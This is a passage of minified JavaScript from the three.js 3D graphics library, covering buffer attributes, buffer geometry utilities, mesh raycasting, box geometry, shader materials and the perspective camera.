        jt.prototype.isMeshBasicMaterial = !0;
        const qt = new be,
            Xt = new he;

        function Yt(e, t, n) {
            if (Array.isArray(e)) throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");
            this.name = "", this.array = e, this.itemSize = t, this.count = void 0 !== e ? e.length / t : 0, this.normalized = !0 === n, this.usage = re, this.updateRange = { offset: 0, count: -1 }, this.version = 0
        }

        function Zt(e, t, n) { Yt.call(this, new Int8Array(e), t, n) }

        function Jt(e, t, n) { Yt.call(this, new Uint8Array(e), t, n) }

        function Kt(e, t, n) { Yt.call(this, new Uint8ClampedArray(e), t, n) }

        function $t(e, t, n) { Yt.call(this, new Int16Array(e), t, n) }

        function Qt(e, t, n) { Yt.call(this, new Uint16Array(e), t, n) }

        function en(e, t, n) { Yt.call(this, new Int32Array(e), t, n) }

        function tn(e, t, n) { Yt.call(this, new Uint32Array(e), t, n) }

        function nn(e, t, n) { Yt.call(this, new Uint16Array(e), t, n) }

        function rn(e, t, n) { Yt.call(this, new Float32Array(e), t, n) }

        function an(e, t, n) { Yt.call(this, new Float64Array(e), t, n) }

        function on(e) { if (0 === e.length) return -1 / 0; let t = e[0]; for (let n = 1, i = e.length; n < i; ++n) e[n] > t && (t = e[n]); return t }
        Object.defineProperty(Yt.prototype, "needsUpdate", { set: function(e) {!0 === e && this.version++ } }), Object.assign(Yt.prototype, {
            isBufferAttribute: !0,
            onUploadCallback: function() {},
            setUsage: function(e) { return this.usage = e, this },
            copy: function(e) { return this.name = e.name, this.array = new e.array.constructor(e.array), this.itemSize = e.itemSize, this.count = e.count, this.normalized = e.normalized, this.usage = e.usage, this },
            copyAt: function(e, t, n) { e *= this.itemSize, n *= t.itemSize; for (let i = 0, r = this.itemSize; i < r; i++) this.array[e + i] = t.array[n + i]; return this },
            copyArray: function(e) { return this.array.set(e), this },
            copyColorsArray: function(e) {
                const t = this.array;
                let n = 0;
                for (let i = 0, r = e.length; i < r; i++) {
                    let r = e[i];
                    void 0 === r && (console.warn("THREE.BufferAttribute.copyColorsArray(): color is undefined", i), r = new Wt), t[n++] = r.r, t[n++] = r.g, t[n++] = r.b
                }
                return this
            },
            copyVector2sArray: function(e) {
                const t = this.array;
                let n = 0;
                for (let i = 0, r = e.length; i < r; i++) {
                    let r = e[i];
                    void 0 === r && (console.warn("THREE.BufferAttribute.copyVector2sArray(): vector is undefined", i), r = new he), t[n++] = r.x, t[n++] = r.y
                }
                return this
            },
            copyVector3sArray: function(e) {
                const t = this.array;
                let n = 0;
                for (let i = 0, r = e.length; i < r; i++) {
                    let r = e[i];
                    void 0 === r && (console.warn("THREE.BufferAttribute.copyVector3sArray(): vector is undefined", i), r = new be), t[n++] = r.x, t[n++] = r.y, t[n++] = r.z
                }
                return this
            },
            copyVector4sArray: function(e) {
                const t = this.array;
                let n = 0;
                for (let i = 0, r = e.length; i < r; i++) {
                    let r = e[i];
                    void 0 === r && (console.warn("THREE.BufferAttribute.copyVector4sArray(): vector is undefined", i), r = new ye), t[n++] = r.x, t[n++] = r.y, t[n++] = r.z, t[n++] = r.w
                }
                return this
            },
            applyMatrix3: function(e) {
                if (2 === this.itemSize)
                    for (let t = 0, n = this.count; t < n; t++) Xt.fromBufferAttribute(this, t), Xt.applyMatrix3(e), this.setXY(t, Xt.x, Xt.y);
                else if (3 === this.itemSize)
                    for (let t = 0, n = this.count; t < n; t++) qt.fromBufferAttribute(this, t), qt.applyMatrix3(e), this.setXYZ(t, qt.x, qt.y, qt.z);
                return this
            },
            applyMatrix4: function(e) { for (let t = 0, n = this.count; t < n; t++) qt.x = this.getX(t), qt.y = this.getY(t), qt.z = this.getZ(t), qt.applyMatrix4(e), this.setXYZ(t, qt.x, qt.y, qt.z); return this },
            applyNormalMatrix: function(e) { for (let t = 0, n = this.count; t < n; t++) qt.x = this.getX(t), qt.y = this.getY(t), qt.z = this.getZ(t), qt.applyNormalMatrix(e), this.setXYZ(t, qt.x, qt.y, qt.z); return this },
            transformDirection: function(e) { for (let t = 0, n = this.count; t < n; t++) qt.x = this.getX(t), qt.y = this.getY(t), qt.z = this.getZ(t), qt.transformDirection(e), this.setXYZ(t, qt.x, qt.y, qt.z); return this },
            set: function(e, t = 0) { return this.array.set(e, t), this },
            getX: function(e) { return this.array[e * this.itemSize] },
            setX: function(e, t) { return this.array[e * this.itemSize] = t, this },
            getY: function(e) { return this.array[e * this.itemSize + 1] },
            setY: function(e, t) { return this.array[e * this.itemSize + 1] = t, this },
            getZ: function(e) { return this.array[e * this.itemSize + 2] },
            setZ: function(e, t) { return this.array[e * this.itemSize + 2] = t, this },
            getW: function(e) { return this.array[e * this.itemSize + 3] },
            setW: function(e, t) { return this.array[e * this.itemSize + 3] = t, this },
            setXY: function(e, t, n) { return e *= this.itemSize, this.array[e + 0] = t, this.array[e + 1] = n, this },
            setXYZ: function(e, t, n, i) { return e *= this.itemSize, this.array[e + 0] = t, this.array[e + 1] = n, this.array[e + 2] = i, this },
            setXYZW: function(e, t, n, i, r) { return e *= this.itemSize, this.array[e + 0] = t, this.array[e + 1] = n, this.array[e + 2] = i, this.array[e + 3] = r, this },
            onUpload: function(e) { return this.onUploadCallback = e, this },
            clone: function() { return new this.constructor(this.array, this.itemSize).copy(this) },
            toJSON: function() { return { itemSize: this.itemSize, type: this.array.constructor.name, array: Array.prototype.slice.call(this.array), normalized: this.normalized } }
        }), Zt.prototype = Object.create(Yt.prototype), Zt.prototype.constructor = Zt, Jt.prototype = Object.create(Yt.prototype), Jt.prototype.constructor = Jt, Kt.prototype = Object.create(Yt.prototype), Kt.prototype.constructor = Kt, $t.prototype = Object.create(Yt.prototype), $t.prototype.constructor = $t, Qt.prototype = Object.create(Yt.prototype), Qt.prototype.constructor = Qt, en.prototype = Object.create(Yt.prototype), en.prototype.constructor = en, tn.prototype = Object.create(Yt.prototype), tn.prototype.constructor = tn, nn.prototype = Object.create(Yt.prototype), nn.prototype.constructor = nn, nn.prototype.isFloat16BufferAttribute = !0, rn.prototype = Object.create(Yt.prototype), rn.prototype.constructor = rn, an.prototype = Object.create(Yt.prototype), an.prototype.constructor = an;
        let sn = 0;
        const ln = new Ze,
            cn = new _t,
            un = new be,
            hn = new Te,
            dn = new Te,
            pn = new be;

        function fn() { Object.defineProperty(this, "id", { value: sn++ }), this.uuid = ue.generateUUID(), this.name = "", this.type = "BufferGeometry", this.index = null, this.attributes = {}, this.morphAttributes = {}, this.morphTargetsRelative = !1, this.groups = [], this.boundingBox = null, this.boundingSphere = null, this.drawRange = { start: 0, count: 1 / 0 }, this.userData = {} }
        fn.prototype = Object.assign(Object.create(se.prototype), {
            constructor: fn,
            isBufferGeometry: !0,
            getIndex: function() { return this.index },
            setIndex: function(e) { return Array.isArray(e) ? this.index = new(on(e) > 65535 ? tn : Qt)(e, 1) : this.index = e, this },
            getAttribute: function(e) { return this.attributes[e] },
            setAttribute: function(e, t) { return this.attributes[e] = t, this },
            deleteAttribute: function(e) { return delete this.attributes[e], this },
            hasAttribute: function(e) { return void 0 !== this.attributes[e] },
            addGroup: function(e, t, n = 0) { this.groups.push({ start: e, count: t, materialIndex: n }) },
            clearGroups: function() { this.groups = [] },
            setDrawRange: function(e, t) { this.drawRange.start = e, this.drawRange.count = t },
            applyMatrix4: function(e) {
                const t = this.attributes.position;
                void 0 !== t && (t.applyMatrix4(e), t.needsUpdate = !0);
                const n = this.attributes.normal;
                if (void 0 !== n) {
                    const t = (new de).getNormalMatrix(e);
                    n.applyNormalMatrix(t), n.needsUpdate = !0
                }
                const i = this.attributes.tangent;
                return void 0 !== i && (i.transformDirection(e), i.needsUpdate = !0), null !== this.boundingBox && this.computeBoundingBox(), null !== this.boundingSphere && this.computeBoundingSphere(), this
            },
            rotateX: function(e) { return ln.makeRotationX(e), this.applyMatrix4(ln), this },
            rotateY: function(e) { return ln.makeRotationY(e), this.applyMatrix4(ln), this },
            rotateZ: function(e) { return ln.makeRotationZ(e), this.applyMatrix4(ln), this },
            translate: function(e, t, n) { return ln.makeTranslation(e, t, n), this.applyMatrix4(ln), this },
            scale: function(e, t, n) { return ln.makeScale(e, t, n), this.applyMatrix4(ln), this },
            lookAt: function(e) { return cn.lookAt(e), cn.updateMatrix(), this.applyMatrix4(cn.matrix), this },
            center: function() { return this.computeBoundingBox(), this.boundingBox.getCenter(un).negate(), this.translate(un.x, un.y, un.z), this },
            setFromPoints: function(e) {
                const t = [];
                for (let n = 0, i = e.length; n < i; n++) {
                    const i = e[n];
                    t.push(i.x, i.y, i.z || 0)
                }
                return this.setAttribute("position", new rn(t, 3)), this
            },
            computeBoundingBox: function() {
                null === this.boundingBox && (this.boundingBox = new Te);
                const e = this.attributes.position,
                    t = this.morphAttributes.position;
                if (e && e.isGLBufferAttribute) return console.error('THREE.BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box. Alternatively set "mesh.frustumCulled" to "false".', this), void this.boundingBox.set(new be(-1 / 0, -1 / 0, -1 / 0), new be(1 / 0, 1 / 0, 1 / 0));
                if (void 0 !== e) {
                    if (this.boundingBox.setFromBufferAttribute(e), t)
                        for (let e = 0, n = t.length; e < n; e++) {
                            const n = t[e];
                            hn.setFromBufferAttribute(n), this.morphTargetsRelative ? (pn.addVectors(this.boundingBox.min, hn.min), this.boundingBox.expandByPoint(pn), pn.addVectors(this.boundingBox.max, hn.max), this.boundingBox.expandByPoint(pn)) : (this.boundingBox.expandByPoint(hn.min), this.boundingBox.expandByPoint(hn.max))
                        }
                } else this.boundingBox.makeEmpty();
                (isNaN(this.boundingBox.min.x) || isNaN(this.boundingBox.min.y) || isNaN(this.boundingBox.min.z)) && console.error('THREE.BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN values.', this)
            },
            computeBoundingSphere: function() {
                null === this.boundingSphere && (this.boundingSphere = new Be);
                const e = this.attributes.position,
                    t = this.morphAttributes.position;
                if (e && e.isGLBufferAttribute) return console.error('THREE.BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere. Alternatively set "mesh.frustumCulled" to "false".', this), void this.boundingSphere.set(new be, 1 / 0);
                if (e) {
                    const n = this.boundingSphere.center;
                    if (hn.setFromBufferAttribute(e), t)
                        for (let e = 0, n = t.length; e < n; e++) {
                            const n = t[e];
                            dn.setFromBufferAttribute(n), this.morphTargetsRelative ? (pn.addVectors(hn.min, dn.min), hn.expandByPoint(pn), pn.addVectors(hn.max, dn.max), hn.expandByPoint(pn)) : (hn.expandByPoint(dn.min), hn.expandByPoint(dn.max))
                        }
                    hn.getCenter(n);
                    let i = 0;
                    for (let t = 0, r = e.count; t < r; t++) pn.fromBufferAttribute(e, t), i = Math.max(i, n.distanceToSquared(pn));
                    if (t)
                        for (let r = 0, a = t.length; r < a; r++) {
                            const a = t[r],
                                o = this.morphTargetsRelative;
                            for (let t = 0, r = a.count; t < r; t++) pn.fromBufferAttribute(a, t), o && (un.fromBufferAttribute(e, t), pn.add(un)), i = Math.max(i, n.distanceToSquared(pn))
                        }
                    this.boundingSphere.radius = Math.sqrt(i), isNaN(this.boundingSphere.radius) && console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.', this)
                }
            },
            computeFaceNormals: function() {},
            computeTangents: function() {
                const e = this.index,
                    t = this.attributes;
                if (null === e || void 0 === t.position || void 0 === t.normal || void 0 === t.uv) return void console.error("THREE.BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");
                const n = e.array,
                    i = t.position.array,
                    r = t.normal.array,
                    a = t.uv.array,
                    o = i.length / 3;
                void 0 === t.tangent && this.setAttribute("tangent", new Yt(new Float32Array(4 * o), 4));
                const s = t.tangent.array,
                    l = [],
                    c = [];
                for (let e = 0; e < o; e++) l[e] = new be, c[e] = new be;
                const u = new be,
                    h = new be,
                    d = new be,
                    p = new he,
                    f = new he,
                    m = new he,
                    g = new be,
                    v = new be;

                function y(e, t, n) {
                    u.fromArray(i, 3 * e), h.fromArray(i, 3 * t), d.fromArray(i, 3 * n), p.fromArray(a, 2 * e), f.fromArray(a, 2 * t), m.fromArray(a, 2 * n), h.sub(u), d.sub(u), f.sub(p), m.sub(p);
                    const r = 1 / (f.x * m.y - m.x * f.y);
                    isFinite(r) && (g.copy(h).multiplyScalar(m.y).addScaledVector(d, -f.y).multiplyScalar(r), v.copy(d).multiplyScalar(f.x).addScaledVector(h, -m.x).multiplyScalar(r), l[e].add(g), l[t].add(g), l[n].add(g), c[e].add(v), c[t].add(v), c[n].add(v))
                }
                let x = this.groups;
                0 === x.length && (x = [{ start: 0, count: n.length }]);
                for (let e = 0, t = x.length; e < t; ++e) {
                    const t = x[e],
                        i = t.start;
                    for (let e = i, r = i + t.count; e < r; e += 3) y(n[e + 0], n[e + 1], n[e + 2])
                }
                const _ = new be,
                    b = new be,
                    w = new be,
                    M = new be;

                function T(e) {
                    w.fromArray(r, 3 * e), M.copy(w);
                    const t = l[e];
                    _.copy(t), _.sub(w.multiplyScalar(w.dot(t))).normalize(), b.crossVectors(M, t);
                    const n = b.dot(c[e]) < 0 ? -1 : 1;
                    s[4 * e] = _.x, s[4 * e + 1] = _.y, s[4 * e + 2] = _.z, s[4 * e + 3] = n
                }
                for (let e = 0, t = x.length; e < t; ++e) {
                    const t = x[e],
                        i = t.start;
                    for (let e = i, r = i + t.count; e < r; e += 3) T(n[e + 0]), T(n[e + 1]), T(n[e + 2])
                }
            },
            computeVertexNormals: function() {
                const e = this.index,
                    t = this.getAttribute("position");
                if (void 0 !== t) {
                    let n = this.getAttribute("normal");
                    if (void 0 === n) n = new Yt(new Float32Array(3 * t.count), 3), this.setAttribute("normal", n);
                    else
                        for (let e = 0, t = n.count; e < t; e++) n.setXYZ(e, 0, 0, 0);
                    const i = new be,
                        r = new be,
                        a = new be,
                        o = new be,
                        s = new be,
                        l = new be,
                        c = new be,
                        u = new be;
                    if (e)
                        for (let h = 0, d = e.count; h < d; h += 3) {
                            const d = e.getX(h + 0),
                                p = e.getX(h + 1),
                                f = e.getX(h + 2);
                            i.fromBufferAttribute(t, d), r.fromBufferAttribute(t, p), a.fromBufferAttribute(t, f), c.subVectors(a, r), u.subVectors(i, r), c.cross(u), o.fromBufferAttribute(n, d), s.fromBufferAttribute(n, p), l.fromBufferAttribute(n, f), o.add(c), s.add(c), l.add(c), n.setXYZ(d, o.x, o.y, o.z), n.setXYZ(p, s.x, s.y, s.z), n.setXYZ(f, l.x, l.y, l.z)
                        } else
                            for (let e = 0, o = t.count; e < o; e += 3) i.fromBufferAttribute(t, e + 0), r.fromBufferAttribute(t, e + 1), a.fromBufferAttribute(t, e + 2), c.subVectors(a, r), u.subVectors(i, r), c.cross(u), n.setXYZ(e + 0, c.x, c.y, c.z), n.setXYZ(e + 1, c.x, c.y, c.z), n.setXYZ(e + 2, c.x, c.y, c.z);
                    this.normalizeNormals(), n.needsUpdate = !0
                }
            },
            merge: function(e, t) {
                if (!e || !e.isBufferGeometry) return void console.error("THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.", e);
                void 0 === t && (t = 0, console.warn("THREE.BufferGeometry.merge(): Overwriting original geometry, starting at offset=0. Use BufferGeometryUtils.mergeBufferGeometries() for lossless merge."));
                const n = this.attributes;
                for (const i in n) {
                    if (void 0 === e.attributes[i]) continue;
                    const r = n[i].array,
                        a = e.attributes[i],
                        o = a.array,
                        s = a.itemSize * t,
                        l = Math.min(o.length, r.length - s);
                    for (let e = 0, t = s; e < l; e++, t++) r[t] = o[e]
                }
                return this
            },
            normalizeNormals: function() { const e = this.attributes.normal; for (let t = 0, n = e.count; t < n; t++) pn.fromBufferAttribute(e, t), pn.normalize(), e.setXYZ(t, pn.x, pn.y, pn.z) },
            toNonIndexed: function() {
                function e(e, t) {
                    const n = e.array,
                        i = e.itemSize,
                        r = e.normalized,
                        a = new n.constructor(t.length * i);
                    let o = 0,
                        s = 0;
                    for (let e = 0, r = t.length; e < r; e++) { o = t[e] * i; for (let e = 0; e < i; e++) a[s++] = n[o++] }
                    return new Yt(a, i, r)
                }
                if (null === this.index) return console.warn("THREE.BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."), this;
                const t = new fn,
                    n = this.index.array,
                    i = this.attributes;
                for (const r in i) {
                    const a = e(i[r], n);
                    t.setAttribute(r, a)
                }
                const r = this.morphAttributes;
                for (const i in r) {
                    const a = [],
                        o = r[i];
                    for (let t = 0, i = o.length; t < i; t++) {
                        const i = e(o[t], n);
                        a.push(i)
                    }
                    t.morphAttributes[i] = a
                }
                t.morphTargetsRelative = this.morphTargetsRelative;
                const a = this.groups;
                for (let e = 0, n = a.length; e < n; e++) {
                    const n = a[e];
                    t.addGroup(n.start, n.count, n.materialIndex)
                }
                return t
            },
            toJSON: function() {
                const e = { metadata: { version: 4.5, type: "BufferGeometry", generator: "BufferGeometry.toJSON" } };
                if (e.uuid = this.uuid, e.type = this.type, "" !== this.name && (e.name = this.name), Object.keys(this.userData).length > 0 && (e.userData = this.userData), void 0 !== this.parameters) { const t = this.parameters; for (const n in t) void 0 !== t[n] && (e[n] = t[n]); return e }
                e.data = { attributes: {} };
                const t = this.index;
                null !== t && (e.data.index = { type: t.array.constructor.name, array: Array.prototype.slice.call(t.array) });
                const n = this.attributes;
                for (const t in n) {
                    const i = n[t],
                        r = i.toJSON(e.data);
                    "" !== i.name && (r.name = i.name), e.data.attributes[t] = r
                }
                const i = {};
                let r = !1;
                for (const t in this.morphAttributes) {
                    const n = this.morphAttributes[t],
                        a = [];
                    for (let t = 0, i = n.length; t < i; t++) {
                        const i = n[t],
                            r = i.toJSON(e.data);
                        "" !== i.name && (r.name = i.name), a.push(r)
                    }
                    a.length > 0 && (i[t] = a, r = !0)
                }
                r && (e.data.morphAttributes = i, e.data.morphTargetsRelative = this.morphTargetsRelative);
                const a = this.groups;
                a.length > 0 && (e.data.groups = JSON.parse(JSON.stringify(a)));
                const o = this.boundingSphere;
                return null !== o && (e.data.boundingSphere = { center: o.center.toArray(), radius: o.radius }), e
            },
            clone: function() { return (new fn).copy(this) },
            copy: function(e) {
                this.index = null, this.attributes = {}, this.morphAttributes = {}, this.groups = [], this.boundingBox = null, this.boundingSphere = null;
                const t = {};
                this.name = e.name;
                const n = e.index;
                null !== n && this.setIndex(n.clone(t));
                const i = e.attributes;
                for (const e in i) {
                    const n = i[e];
                    this.setAttribute(e, n.clone(t))
                }
                const r = e.morphAttributes;
                for (const e in r) {
                    const n = [],
                        i = r[e];
                    for (let e = 0, r = i.length; e < r; e++) n.push(i[e].clone(t));
                    this.morphAttributes[e] = n
                }
                this.morphTargetsRelative = e.morphTargetsRelative;
                const a = e.groups;
                for (let e = 0, t = a.length; e < t; e++) {
                    const t = a[e];
                    this.addGroup(t.start, t.count, t.materialIndex)
                }
                const o = e.boundingBox;
                null !== o && (this.boundingBox = o.clone());
                const s = e.boundingSphere;
                return null !== s && (this.boundingSphere = s.clone()), this.drawRange.start = e.drawRange.start, this.drawRange.count = e.drawRange.count, this.userData = e.userData, this
            },
            dispose: function() { this.dispatchEvent({ type: "dispose" }) }
        });
        const mn = new Ze,
            gn = new Ye,
            vn = new Be,
            yn = new be,
            xn = new be,
            _n = new be,
            bn = new be,
            wn = new be,
            Mn = new be,
            Tn = new be,
            En = new be,
            Sn = new be,
            Ln = new he,
            An = new he,
            Rn = new he,
            Pn = new be,
            Cn = new be;

        function Dn(e = new fn, t = new jt) { _t.call(this), this.type = "Mesh", this.geometry = e, this.material = t, this.updateMorphTargets() }

        function Nn(e, t, n, i, r, a, o, s, l, c, u, h) {
            yn.fromBufferAttribute(r, c), xn.fromBufferAttribute(r, u), _n.fromBufferAttribute(r, h);
            const d = e.morphTargetInfluences;
            if (t.morphTargets && a && d) {
                Tn.set(0, 0, 0), En.set(0, 0, 0), Sn.set(0, 0, 0);
                for (let e = 0, t = a.length; e < t; e++) {
                    const t = d[e],
                        n = a[e];
                    0 !== t && (bn.fromBufferAttribute(n, c), wn.fromBufferAttribute(n, u), Mn.fromBufferAttribute(n, h), o ? (Tn.addScaledVector(bn, t), En.addScaledVector(wn, t), Sn.addScaledVector(Mn, t)) : (Tn.addScaledVector(bn.sub(yn), t), En.addScaledVector(wn.sub(xn), t), Sn.addScaledVector(Mn.sub(_n), t)))
                }
                yn.add(Tn), xn.add(En), _n.add(Sn)
            }
            e.isSkinnedMesh && t.skinning && (e.boneTransform(c, yn), e.boneTransform(u, xn), e.boneTransform(h, _n));
            const p = function(e, t, n, i, r, a, o, s) {
                let l;
                if (l = 1 === t.side ? i.intersectTriangle(o, a, r, !0, s) : i.intersectTriangle(r, a, o, 2 !== t.side, s), null === l) return null;
                Cn.copy(s), Cn.applyMatrix4(e.matrixWorld);
                const c = n.ray.origin.distanceTo(Cn);
                return c < n.near || c > n.far ? null : { distance: c, point: Cn.clone(), object: e }
            }(e, t, n, i, yn, xn, _n, Pn);
            if (p) {
                s && (Ln.fromBufferAttribute(s, c), An.fromBufferAttribute(s, u), Rn.fromBufferAttribute(s, h), p.uv = Ot.getUV(Pn, yn, xn, _n, Ln, An, Rn, new he)), l && (Ln.fromBufferAttribute(l, c), An.fromBufferAttribute(l, u), Rn.fromBufferAttribute(l, h), p.uv2 = Ot.getUV(Pn, yn, xn, _n, Ln, An, Rn, new he));
                const e = { a: c, b: u, c: h, normal: new be, materialIndex: 0 };
                Ot.getNormal(yn, xn, _n, e.normal), p.face = e
            }
            return p
        }
        Dn.prototype = Object.assign(Object.create(_t.prototype), {
            constructor: Dn,
            isMesh: !0,
            copy: function(e) { return _t.prototype.copy.call(this, e), void 0 !== e.morphTargetInfluences && (this.morphTargetInfluences = e.morphTargetInfluences.slice()), void 0 !== e.morphTargetDictionary && (this.morphTargetDictionary = Object.assign({}, e.morphTargetDictionary)), this.material = e.material, this.geometry = e.geometry, this },
            updateMorphTargets: function() {
                const e = this.geometry;
                if (e.isBufferGeometry) {
                    const t = e.morphAttributes,
                        n = Object.keys(t);
                    if (n.length > 0) {
                        const e = t[n[0]];
                        if (void 0 !== e) {
                            this.morphTargetInfluences = [], this.morphTargetDictionary = {};
                            for (let t = 0, n = e.length; t < n; t++) {
                                const n = e[t].name || String(t);
                                this.morphTargetInfluences.push(0), this.morphTargetDictionary[n] = t
                            }
                        }
                    }
                } else {
                    const t = e.morphTargets;
                    void 0 !== t && t.length > 0 && console.error("THREE.Mesh.updateMorphTargets() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")
                }
            },
            raycast: function(e, t) {
                const n = this.geometry,
                    i = this.material,
                    r = this.matrixWorld;
                if (void 0 === i) return;
                if (null === n.boundingSphere && n.computeBoundingSphere(), vn.copy(n.boundingSphere), vn.applyMatrix4(r), !1 === e.ray.intersectsSphere(vn)) return;
                if (mn.copy(r).invert(), gn.copy(e.ray).applyMatrix4(mn), null !== n.boundingBox && !1 === gn.intersectsBox(n.boundingBox)) return;
                let a;
                if (n.isBufferGeometry) {
                    const r = n.index,
                        o = n.attributes.position,
                        s = n.morphAttributes.position,
                        l = n.morphTargetsRelative,
                        c = n.attributes.uv,
                        u = n.attributes.uv2,
                        h = n.groups,
                        d = n.drawRange;
                    if (null !== r)
                        if (Array.isArray(i))
                            for (let n = 0, p = h.length; n < p; n++) {
                                const p = h[n],
                                    f = i[p.materialIndex];
                                for (let n = Math.max(p.start, d.start), i = Math.min(p.start + p.count, d.start + d.count); n < i; n += 3) {
                                    const i = r.getX(n),
                                        h = r.getX(n + 1),
                                        d = r.getX(n + 2);
                                    a = Nn(this, f, e, gn, o, s, l, c, u, i, h, d), a && (a.faceIndex = Math.floor(n / 3), a.face.materialIndex = p.materialIndex, t.push(a))
                                }
                            } else
                                for (let n = Math.max(0, d.start), h = Math.min(r.count, d.start + d.count); n < h; n += 3) {
                                    const h = r.getX(n),
                                        d = r.getX(n + 1),
                                        p = r.getX(n + 2);
                                    a = Nn(this, i, e, gn, o, s, l, c, u, h, d, p), a && (a.faceIndex = Math.floor(n / 3), t.push(a))
                                } else if (void 0 !== o)
                                    if (Array.isArray(i))
                                        for (let n = 0, r = h.length; n < r; n++) {
                                            const r = h[n],
                                                p = i[r.materialIndex];
                                            for (let n = Math.max(r.start, d.start), i = Math.min(r.start + r.count, d.start + d.count); n < i; n += 3) a = Nn(this, p, e, gn, o, s, l, c, u, n, n + 1, n + 2), a && (a.faceIndex = Math.floor(n / 3), a.face.materialIndex = r.materialIndex, t.push(a))
                                        } else
                                            for (let n = Math.max(0, d.start), r = Math.min(o.count, d.start + d.count); n < r; n += 3) a = Nn(this, i, e, gn, o, s, l, c, u, n, n + 1, n + 2), a && (a.faceIndex = Math.floor(n / 3), t.push(a))
                } else n.isGeometry && console.error("THREE.Mesh.raycast() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")
            }
        });
        class In extends fn {
            constructor(e = 1, t = 1, n = 1, i = 1, r = 1, a = 1) {
                super(), this.type = "BoxGeometry", this.parameters = { width: e, height: t, depth: n, widthSegments: i, heightSegments: r, depthSegments: a };
                const o = this;
                i = Math.floor(i), r = Math.floor(r), a = Math.floor(a);
                const s = [],
                    l = [],
                    c = [],
                    u = [];
                let h = 0,
                    d = 0;

                function p(e, t, n, i, r, a, p, f, m, g, v) {
                    const y = a / m,
                        x = p / g,
                        _ = a / 2,
                        b = p / 2,
                        w = f / 2,
                        M = m + 1,
                        T = g + 1;
                    let E = 0,
                        S = 0;
                    const L = new be;
                    for (let a = 0; a < T; a++) {
                        const o = a * x - b;
                        for (let s = 0; s < M; s++) {
                            const h = s * y - _;
                            L[e] = h * i, L[t] = o * r, L[n] = w, l.push(L.x, L.y, L.z), L[e] = 0, L[t] = 0, L[n] = f > 0 ? 1 : -1, c.push(L.x, L.y, L.z), u.push(s / m), u.push(1 - a / g), E += 1
                        }
                    }
                    for (let e = 0; e < g; e++)
                        for (let t = 0; t < m; t++) {
                            const n = h + t + M * e,
                                i = h + t + M * (e + 1),
                                r = h + (t + 1) + M * (e + 1),
                                a = h + (t + 1) + M * e;
                            s.push(n, i, a), s.push(i, r, a), S += 6
                        }
                    o.addGroup(d, S, v), d += S, h += E
                }
                p("z", "y", "x", -1, -1, n, t, e, a, r, 0), p("z", "y", "x", 1, -1, n, t, -e, a, r, 1), p("x", "z", "y", 1, 1, e, n, t, i, a, 2), p("x", "z", "y", 1, -1, e, n, -t, i, a, 3), p("x", "y", "z", 1, -1, e, t, n, i, r, 4), p("x", "y", "z", -1, -1, e, t, -n, i, r, 5), this.setIndex(s), this.setAttribute("position", new rn(l, 3)), this.setAttribute("normal", new rn(c, 3)), this.setAttribute("uv", new rn(u, 2))
            }
        }

        function On(e) {
            const t = {};
            for (const n in e) {
                t[n] = {};
                for (const i in e[n]) {
                    const r = e[n][i];
                    r && (r.isColor || r.isMatrix3 || r.isMatrix4 || r.isVector2 || r.isVector3 || r.isVector4 || r.isTexture || r.isQuaternion) ? t[n][i] = r.clone() : Array.isArray(r) ? t[n][i] = r.slice() : t[n][i] = r
                }
            }
            return t
        }

        function Hn(e) { const t = {}; for (let n = 0; n < e.length; n++) { const i = On(e[n]); for (const e in i) t[e] = i[e] } return t }
        const Un = { clone: On, merge: Hn };

        function Fn(e) { Ut.call(this), this.type = "ShaderMaterial", this.defines = {}, this.uniforms = {}, this.vertexShader = "void main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}", this.fragmentShader = "void main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}", this.linewidth = 1, this.wireframe = !1, this.wireframeLinewidth = 1, this.fog = !1, this.lights = !1, this.clipping = !1, this.skinning = !1, this.morphTargets = !1, this.morphNormals = !1, this.extensions = { derivatives: !1, fragDepth: !1, drawBuffers: !1, shaderTextureLOD: !1 }, this.defaultAttributeValues = { color: [1, 1, 1], uv: [0, 0], uv2: [0, 0] }, this.index0AttributeName = void 0, this.uniformsNeedUpdate = !1, this.glslVersion = null, void 0 !== e && (void 0 !== e.attributes && console.error("THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead."), this.setValues(e)) }

        function zn() { _t.call(this), this.type = "Camera", this.matrixWorldInverse = new Ze, this.projectionMatrix = new Ze, this.projectionMatrixInverse = new Ze }

        function Bn(e = 50, t = 1, n = .1, i = 2e3) { zn.call(this), this.type = "PerspectiveCamera", this.fov = e, this.zoom = 1, this.near = n, this.far = i, this.focus = 10, this.aspect = t, this.view = null, this.filmGauge = 35, this.filmOffset = 0, this.updateProjectionMatrix() }
        Fn.prototype = Object.create(Ut.prototype), Fn.prototype.constructor = Fn, Fn.prototype.isShaderMaterial = !0, Fn.prototype.copy = function(e) { return Ut.prototype.copy.call(this, e), this.fragmentShader = e.fragmentShader, this.vertexShader = e.vertexShader, this.uniforms = On(e.uniforms), this.defines = Object.assign({}, e.defines), this.wireframe = e.wireframe, this.wireframeLinewidth = e.wireframeLinewidth, this.lights = e.lights, this.clipping = e.clipping, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this.morphNormals = e.morphNormals, this.extensions = Object.assign({}, e.extensions), this.glslVersion = e.glslVersion, this }, Fn.prototype.toJSON = function(e) {
            const t = Ut.prototype.toJSON.call(this, e);
            t.glslVersion = this.glslVersion, t.uniforms = {};
            for (const n in this.uniforms) {
                const i = this.uniforms[n].value;
